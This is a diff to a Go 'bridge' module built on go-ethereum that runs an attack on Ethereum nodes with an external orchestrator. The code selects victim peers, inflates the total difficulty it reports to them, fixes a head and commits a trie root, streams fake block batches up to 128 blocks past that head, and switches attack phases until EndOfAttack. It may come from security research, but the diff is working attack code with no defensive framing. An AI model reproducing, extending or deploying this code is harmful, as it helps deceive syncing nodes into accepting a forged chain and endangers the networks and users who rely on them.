@@ -1,13 +1,11 @@
 package bridge
 
-import "fmt"
 import "net"
 import "math/big"
 import "time"
 import "sync"
 import "encoding/binary"
 import "bytes"
-import "runtime"
 import "os"
 import "github.com/ethereum/go-ethereum/p2p"
 import "github.com/ethereum/go-ethereum/ethdb"
@@ -111,6 +109,18 @@ func Initialize(id string) error {
 	go readLoop(conn, incoming, quitCh)
 	go handleMessages()
 
+	path, err := os.Getwd()
+	if err != nil {
+		log("err =", err)
+		log("Could not get working directory")
+		return err
+	}
+	err = sendMessage(msg.Cwd.SetContent([]byte(path)))
+	if err != nil {
+		log("err =", err)
+		log("Could not send cwd to orchestrator")
+		return err
+	}
 
 	log("Initialized bridge")
 	initialized = true
@@ -123,7 +133,7 @@ func IsInitialized() bool {
 
 func SetMasterPeer() {
 	if attackPhase == utils.StalePhase {	// Cannot start an attack yet. Ignore this victim
-		log("Not setting as master peer due to insufficient number of malicious peers")
+		log("Not setting as master peer because in stale phase")
 		return
 	}
 
@@ -137,7 +147,7 @@ func SetMasterPeer() {
 func SetVictimIfNone(v *p2p.Peer, td *big.Int) {
 	vID := v.ID().String()[:8]
 	if attackPhase == utils.StalePhase {	// Cannot start an attack yet. Ignore this victim
-		log("Ignoring victim", vID, "due to insufficient number of malicious peers")
+		log("Ignoring victim", vID, "due to attack in stale phase")
 		return
 	}
 
@@ -172,12 +182,36 @@ func SetVictimIfNone(v *p2p.Peer, td *big.Int) {
 				Close()
 				fatal(err, "Could not announce new phase to orchestrator")
 			}
-		else {
+		} else {
 			fatal(utils.StateError, "Victim should not be set in", attackPhase, "phase")
 		}
 
-		fixedHead = latest(utils.TrueChain).Number.Uint64()
-		err = sendMessage(msg.OriginalHead.SetContent())
+		var head *types.Header
+		fixHeadLock.Lock()
+		if fixedHead == 0 {
+		head = latest(utils.TrueChain)
+		fixedHead = head.Number.Uint64()
+		r := head.Root
+		err = (*stateCache).TrieDB().Commit(r, true, nil)
+		if err != nil {
+			fatal(err, "Cannot commit root at fixedHead,", "fixedHead =", fixedHead, "root =", r)
+		}
+		log("Committed trie root, fixedHead =", fixedHead, ", root =", r)
+		} else {
+			head = getHeaderByNumber(utils.TrueChain, fixedHead)
+		}
+		fixHeadLock.Unlock()
+
+		headRlp, err := rlp.EncodeToBytes(head)
+		if err != nil {
+			fatal(err, "Couldn't RLP-encode header")
+		}
+		err = sendMessage(msg.OriginalHead.SetContent(headRlp))
+		if err != nil {
+			fatal(err, "Couldn't send original head to orchestrator")
+		}
+
+		go SendGhostRoot(fixedHead)
 
 		log("Set victim:", vID)
 
@@ -270,13 +304,30 @@ func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, *common.Hash,
 		if peerTD.Cmp(threshold) > 0 {
 			return nil, false, nil, nil
 		}
-		head = latest(utils.TrueChain)
+		var head *types.Header
+		fixHeadLock.Lock()
+		if fixedHead == 0 {
+			head = latest(utils.TrueChain)
+			fixedHead = head.Number.Uint64()
+			r := head.Root
+			err := (*stateCache).TrieDB().Commit(r, true, nil)
+			if err != nil {
+				fatal(err, "Cannot commit root at fixedHead,", "fixedHead =", fixedHead, "root =", r)
+			}
+			log("Committed trie root, fixedHead =", fixedHead, ", root =", r)
+		} else {
+			head = getHeaderByNumber(utils.TrueChain, fixedHead)
+		}
+		fixHeadLock.Unlock()
 		supplement := head.Difficulty
 		supplement.Mul(supplement, big.NewInt(2))
 		td := new(big.Int).Add(getTd(utils.TrueChain), supplement)
 					log("True TD in database (+suppl.):", td)
 		log("Cheating to peer", peerID, "if necessary at this point")
-		headHash := head.Hash()
+		headHash := getHashByNumber(utils.TrueChain, fixedHead)
+
+		log("Head.Number =", head.Number.Uint64(), "Head.Hash =", headHash)
+		log("Nonce =", head.Nonce.Uint64(), "ParentHash =", head.ParentHash)
 		return td, mustCheatAboutTd, &headHash, nil
 	}
 }
@@ -289,8 +340,8 @@ func Latest(chainTypeArg ...utils.ChainType) *types.Header {
 		fatal(utils.ParameterErr, "Trying to get latest block while attack is stale")
 		return nil
 		*/
-		log("Latest() returning latest block of", utils.PredictionChain, "chain even if we are in", attackPhase)
-		chainType = utils.PredictionChain
+		log("Latest() returning latest block of", utils.TrueChain, "chain even if we are in", attackPhase)
+		chainType = utils.TrueChain
 	}
 	return latest(chainType)
 }
@@ -298,8 +349,8 @@ func Latest(chainTypeArg ...utils.ChainType) *types.Header {
 func Genesis() *types.Header {
 	chainType := attackPhase.ToChainType()
 	if chainType == utils.InvalidChainType {
-		log("Genesis() returning genesis block of", utils.PredictionChain, "chain even if we are in", attackPhase)
-		chainType = utils.PredictionChain
+		log("Genesis() returning genesis block of", utils.TrueChain, "chain even if we are in", attackPhase)
+		chainType = utils.TrueChain
 	}
 	return genesis(chainType)
 }
@@ -347,6 +398,18 @@ func MustIgnoreBlock(number uint64) bool {
 
 func FakeBatchesToImport() chan types.Blocks {
 	return fakeBatches
+}
+
+func IsLastFakeBlock(number uint64) bool {
+	return number==(fixedHead+128)
+}
+
+func EndOfAttack() {
+	err := sendMessage(msg.EndOfAttack)
+	if err != nil {
+		log("Could not notify end of attack to orchestrator, err =", err)
+	}
+	Close()
 }
 
 func Close() {
@@ -432,8 +495,17 @@ func handleMessages() {
 				}
 			case msg.FakeBatch.Code:
 				if message.Content == nil || len(message.Content) == 0 {
-					allFakeBatchesReceived = true
 					log("All fake batches received")
+					allFakeBatchesReceived = true
+					fakeBatches <- nil
+					if attackPhase != utils.DeliveryPhase {
+						attackPhase = utils.DeliveryPhase
+						log("Switched to", attackPhase, "phase")
+						err := sendMessage(msg.SetAttackPhase.SetContent([]byte{byte(attackPhase)}))
+						if err != nil {
+							fatal(err, "Could not announce new phase to orchestrator")
+						}
+					}
 				} else {
 					log("Fake batch arrived")
 					numBlocks := binary.BigEndian.Uint32(message.Content[:4])
